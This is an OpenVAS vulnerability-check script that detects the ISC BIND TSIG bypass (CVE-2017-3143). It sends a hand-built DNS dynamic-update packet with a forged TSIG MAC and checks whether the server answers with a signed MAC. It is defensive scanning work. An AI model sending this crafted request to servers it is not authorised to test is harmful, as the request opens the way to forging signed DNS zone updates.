###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_isc_bind_tsig_auth_vuln_remote.nasl 13654 2019-02-14 07:51:59Z mmartin $
#
# ISC BIND Security Bypass Vulnerability (Remote)
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:isc:bind";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106953");
  script_version("$Revision: 13654 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 08:51:59 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-07-17 09:23:57 +0700 (Mon, 17 Jul 2017)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2017-3143");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ISC BIND Security Bypass Vulnerability (Remote)");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("bind_version.nasl");
  script_mandatory_keys("ISC BIND/installed");

  script_tag(name:"summary", value:"A flaw was found in the way BIND handled TSIG authentication for dynamic
updates. A remote attacker able to communicate with an authoritative BIND server could use this flaw to
manipulate the contents of a zone, by forging a valid TSIG or SIG(0) signature for a dynamic update request.");

  script_tag(name:"vuldetect", value:"Sends a crafted update request for the TSIG key 'local-ddns' and checks
if the response returns a signed MAC.");

  script_tag(name:"affected", value:"ISC BIND versions 9.4.0-9.8.8, 9.9.0-9.9.10-P1, 9.10.0-9.10.5-P1,
9.11.0-9.11.1-P1, 9.9.3-S1-9.9.10-S2 and 9.10.5-S1-9.10.5-S2");

  script_tag(name:"solution", value:"Update to version 9.9.10-P2, 9.10.5-P2, 9.11.1-P2, 9.9.10-S3, 9.10.5-S3
or later.");

  script_xref(name:"URL", value:"https://kb.isc.org/article/AA-01503/0");
  script_xref(name:"URL", value:"http://www.synacktiv.ninja/ressources/CVE-2017-3143_BIND9_TSIG_dynamic_updates_vulnerability_Synacktiv.pdf");

  exit(0);
}

include("byte_func.inc");
include("host_details.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!infos = get_app_location_and_proto(cpe: CPE, port: port))
  exit(0);

proto = infos["proto"];

if (proto == "tcp")
  soc = open_sock_tcp(port);
else
  soc = open_sock_udp(port);

if (!soc)
  exit(0);

time = unixtime();
id = rand() % 65635;

trigger_req = raw_string(dec2hex(num: id),                   # Transaction ID
                         0x28, 0x00,                         # Flags (Dynamic Update)
                         0x00, 0x01,                         # Zones
                         0x00, 0x00,                         # Prerequisites
                         0x00, 0x00,                         # Updates
                         0x00, 0x01,                         # Additional RRs
                         # Zone: (example.com: type SOA, class IN)
                         0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x03,
                         0x63, 0x6f, 0x6d, 0x00, 0x00, 0x06, 0x00, 0x01,
                         # Additional records (TSIG)
                         0x0a, 0x6c, 0x6f, 0x63, 0x61, 0x6c, # Name: local-ddns
                         0x2d, 0x64, 0x64, 0x6e, 0x73, 0x00,
                         0x00, 0xfa,                         # Type: TSIG
                         0x00, 0xff,                         # Class: ANY
                         0x00, 0x00, 0x00, 0x00,             # Time to live
                         0x00, 0x5d,                         # length
                         0x0b, 0x68, 0x6d, 0x61, 0x63, 0x2d, # Algorithm: hmac-sha256
                         0x73, 0x68, 0x61, 0x32, 0x35, 0x36, 0x00,
                         mkpad(2), dec2hex(num: time),
                         0x01, 0x2c,                         # Fudge
                         0x00, 0x40,                         # MAC size
                         mkpad(64),                          # Fake MAC
                         0xd0, 0x51,                         # Original Transaction ID
                         0x00, 0x00,                         # No Error
                         0x00, 0x00                          # Other length
                         );

if (proto == "tcp")
  trigger_req = raw_string(0x00, 0x90) + trigger_req;       # Add length

send(socket: soc, data: trigger_req);
res = recv(socket: soc, length: 1024);
close(soc);

if (!res)
  exit(0);

if (proto == "tcp") {
  len = getword(blob: res, pos: 0);
  error = getword(blob: res, pos: len-2);
} else {
  len = strlen(res);
  error = getword(blob: res, pos: len-4);
}

if (error == 0 && len > 45) {
  mac = substr(res, len-36, len-5);
  report = "The server responded with the following signed request MAC:\n\n" + hexstr(mac);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
